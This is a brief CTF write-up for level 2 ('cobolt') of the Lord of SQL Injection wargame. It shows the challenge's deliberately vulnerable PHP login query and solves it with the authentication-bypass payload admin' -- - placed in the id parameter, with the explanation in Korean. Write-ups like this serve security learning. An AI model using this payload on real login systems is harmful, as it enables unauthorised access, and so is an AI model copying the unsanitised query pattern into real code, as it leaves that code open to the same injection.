# Lord-Of-SQL-Injection 02 cobolt

## Overview

```php
<?php
    include "./config.php";
    login_chk();
    dbconnect();
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
    $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = @mysql_fetch_array(mysql_query($query));
    if($result['id'] == 'admin') solve("cobolt");
    elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>";
    highlight_file(__FILE__);
?>
```

## How to solve

gremlin 과 똑같이 `admin' -- -` 를 id 쿼리 스트링 안에 넣으면 된다.

쿼리는 `select id from prob_cobolt where id='admin' -- -' and pw=md5('')` 가 된다.